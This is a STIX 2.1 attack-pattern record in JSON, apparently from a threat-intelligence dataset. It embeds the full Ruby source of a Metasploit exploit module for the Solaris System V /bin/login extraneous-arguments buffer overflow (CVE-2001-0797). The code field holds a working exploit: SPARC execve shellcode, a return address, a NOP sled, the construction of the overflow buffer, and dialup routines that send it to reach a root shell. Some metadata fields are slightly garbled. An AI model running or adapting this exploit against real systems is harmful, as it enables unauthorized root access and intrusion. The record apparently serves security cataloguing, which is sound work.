{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e7938ba0-aaad-49b8-8ddd-66052d8c1191",
    "created": "2024-08-14T16:33:46.973266Z",
    "modified": "2024-08-14T16:33:46.97327Z",
    "name": "System V Derived /bin/login Extraneous Arguments Buffer Overflow",
    "description": " This exploit connects to a system's modem over dialup and exploits a buffer overflow vulnerability in it's System V derived /bin/login. The vulnerability is triggered by providing a large number of arguments.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/dialup/multi/login/manyargs.rb",
            "external_id": "manyargs.rb"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/bugtraq/2002-10/0014.html"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/bugtraq/2004-12/0404.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Dialup\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'System V Derived /bin/login Extraneous Arguments Buffer Overflow',\n      'Description'\t=> %q{\n          This exploit connects to a system's modem over dialup and exploits\n        a buffer overflow vulnerability in it's System V derived /bin/login.\n        The vulnerability is triggered by providing a large number of arguments.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2001-0797'],\n          [ 'OSVDB', '690'],\n          [ 'OSVDB', '691'],\n          [ 'BID', '3681'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2002-10/0014.html'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-12/0404.html'],\n        ],\n      'Author'\t=>\n        [\n          'I)ruid',\n        ],\n      'Arch'\t\t=> ARCH_TTY,\n      'Platform'\t=> ['unix'],\n      'License'\t=> MSF_LICENSE,\n      'Payload'        =>\n        {\n          'Space'       => 3000,\n          'BadChars'    => '',\n          'DisableNops' => true,\n        },\n      'Targets'        =>\n        [\n          [ 'Solaris 2.6 - 8 (SPARC)',\n            {\n              'Platform' => 'unix',\n              'Ret'      => 0x00027184,\n              # Solaris/SPARC special shellcode (courtesy of inode)\n              # execve() + exit()\n              'Shellcode' =>\n                \"\\x94\\x10\\x20\\x00\\x21\\x0b\\xd8\\x9a\\xa0\\x14\\x21\\x6e\\x23\\x0b\\xcb\\xdc\" +\n                \"\\xa2\\x14\\x63\\x68\\xd4\\x23\\xbf\\xfc\\xe2\\x23\\xbf\\xf8\\xe0\\x23\\xbf\\xf4\" +\n                \"\\x90\\x23\\xa0\\x0c\\xd4\\x23\\xbf\\xf0\\xd0\\x23\\xbf\\xec\\x92\\x23\\xa0\\x14\" +\n                \"\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x08\\x82\\x10\\x20\\x01\\x91\\xd0\\x20\\x08\",\n              'NOP' => \"\\x90\\x1b\\x80\\x0e\",\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2001-12-12'))\n\n    register_options(\n      [\n#\t\t\t\tOptString.new('USER', [true, 'User to log in as', 'bin']),\n      ])\n  end\n\n  def buildbuf\n    print_status(\"Targeting: #{self.target.name}\")\n\n    retaddr   = self.target.ret\n    shellcode = self.target['Shellcode']\n    nop       = self.target['NOP']\n\n    user      = datastore['USER']\n    command   = datastore['COMMAND'] + \"\\n\"\n\n    # prepare the evil buffer\n    i = 0\n    buf = ''\n\n    # login name\n    buf[i,4] = 'bin '\n    i += 4\n\n    # return address\n    buf[i,4] = [retaddr].pack('N')\n    i += 4\n    buf[i,1] = ' '\n    i += 1\n\n    # trigger the overflow\n    (0...60).each {|c|\n      buf[i,2] = 'a '\n      i += 2\n    }\n\n    # padding\n    buf[i,4] = ' BBB'\n    i += 4\n\n    # nop sled and shellcode\n    (0...398).each {|c|\n      buf[i,nop.size] = nop\n      i += nop.size\n    }\n    shellcode.each_byte {|b|\n      c = b.chr\n      case 'c'\n      when \"\\\\\"\n        buf[i,2] = \"\\\\\\\\\"\n        i += 2\n      when \"\\xff\", \"\\n\", \" \", \"\\t\"\n        buf[i,1] = \"\\\\\"\n        buf[i+1,1] = (((b & 0300) >> 6) + '0').chr\n        buf[i+2,1] = (((b & 0070) >> 3) + '0').chr\n        buf[i+3,1] = ( (b & 0007)       + '0').chr\n        i += 4\n      else\n        buf[i,1] = c\n        i += 1\n      end\n    }\n    # TODO: need to overwrite/skip the last byte of shellcode?\n    #i -= 1\n\n    # padding\n    buf[i,4] = 'BBB '\n    i += 4\n\n    # pam_handle_t: minimal header\n    buf[i,16] = 'CCCCCCCCCCCCCCCC'\n    i += 16\n    buf[i,4] = [retaddr].pack('N')\n    i += 4\n    buf[i,4] = [0x01].pack('N')\n    i += 4\n\n    # pam_handle_t: NULL padding\n    (0...52).each {|c|\n      buf[i,4] = [0].pack('N')\n      i += 4\n    }\n\n    # pam_handle_t: pameptr must be the 65th ptr\n    buf[i,9] = \"\\x00\\x00\\x00 AAAA\\n\"\n    i += 9\n\n    return buf\n  end\n\n  def exploit\n    buf = buildbuf\n\n    print_status(\"Dialing Target\")\n    if not connect_dialup\n      print_error(\"Exiting.\")\n      return\n    end\n\n    print_status(\"Waiting for login prompt\")\n\n    res = dialup_expect(/ogin:\\s/i, 10)\n    #puts Rex::Text.to_hex_dump(res[:buffer])\n    if not res[:match]\n      print_error(\"Login prompt not found... Exiting.\")\n      disconnect_dialup\n      return\n    end\n\n    # send the evil buffer, 256 chars at a time\n    print_status(\"Sending evil buffer...\")\n    #puts Rex::Text.to_hex_dump(buf)\n    len = buf.length\n    p = 0\n    while(len > 0) do\n      i = len > 0x100 ? 0x100 : len\n      #puts Rex::Text.to_hex_dump(buf[p,i])\n      dialup_puts(buf[p,i])\n      len -= i\n      p += i\n#\t\t\tif len > 0\n#\t\t\t\tputs Rex::Text.to_hex_dump(\"\\x04\")\n#\t\t\t\tdialup_puts(\"\\x04\") if len > 0\n#\t\t\tend\n      select(nil,nil,nil,0.5)\n    end\n\n    # wait for password prompt\n    print_status(\"Waiting for password prompt\")\n    res = dialup_expect(/assword:/i, 30)\n    #puts Rex::Text.to_hex_dump(res[:buffer])\n    if not res[:match]\n      print_error(\"Target is likely not vulnerable... Exiting.\")\n      disconnect_dialup\n      return\n    end\n\n    print_status(\"Password prompt received, waiting for shell\")\n    dialup_puts(\"pass\\n\")\n\n    res = dialup_expect(/#\\s/i, 20)\n    #puts Rex::Text.to_hex_dump(res[:buffer])\n    if not res[:match]\n      print_error(\"Shell not found.\")\n      print_error(\"Target is likely not vulnerable... Exiting.\")\n      disconnect_dialup\n      return\n    end\n\n    print_status(\"Success!!!\")\n    handler\n\n    disconnect_dialup\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2001-12-12",
    "x_mitre_platforms": [
        "unix'"
    ]
}